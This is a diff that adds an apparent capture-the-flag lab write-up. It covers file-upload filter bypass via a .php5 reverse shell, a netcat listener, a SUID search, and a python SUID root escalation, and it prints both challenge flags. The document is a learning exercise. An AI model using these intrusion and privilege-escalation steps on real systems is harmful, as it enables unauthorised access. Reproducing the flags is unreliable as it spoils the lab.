@@ -1,0 +1,66 @@
+First thing I did was enter the IP into a browser. 
+
+'View page source' revealed nothing of interest.
+
+Ran nmap-dirsearch.sh (script in Bash repository)
+    Open Ports:
+        22
+        80
+    Directories:
+        /js/
+        /css/
+        /panel/
+        /uploads/
+        
+I navigated to /panel/. There was a field for uploading a file. 
+    First tried a php script for a reverse shell.
+        phpreverseshell.php - Error uploading
+    Then I tried a pdf file to see if anything would upload.
+        Uploaded successfully
+    So then I tried the php with a modification to the file name.
+        phpreverseshell.pdf.php - Error again
+    Then I figured I would try the php file again but as a php5
+        phpreverseshell.php5 - SUCCESS
+        
+Navigate to /uploads/. The file is there.
+
+Opened a netcat listener.
+    nc -nlvp 4444
+    
+Ran the script on the web page. - SUCCESS
+
+I searched the target machine for the user.txt file.
+    I used - find . -type f -name user.txt
+    
+I found the file in /var/www/
+    flag - THM{y0u_g0t_a_sh3ll}
+    
+Need to find files with SUID permissions. The hint says, and a quick goggle search confirmed:
+    find / -user root -perm /4000
+    
+The file that looks "weird" or promising is:
+    /usr/bin/python
+    
+We need to find a way to leverage python to escalate privileges.
+
+The hint it gives us is to search gtfobins.
+    
+On their site there is a section for python. Scroll down to the section for SUID.
+    Copied the code and entered it into the target machine.
+        ./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+        
+Check to see if the code worked.
+    whoami
+
+It says that I am now root.
+
+Searched for the root.txt file.
+    find . -type f -name root.txt
+        /root/root.txt
+        
+Navigated there and read the file to get the final flag.
+    cat root.txt
+        THM{pr1v1l3g3_3sc4l4t10n}
+        
+Congratulations!!! Finished!!!!
+        
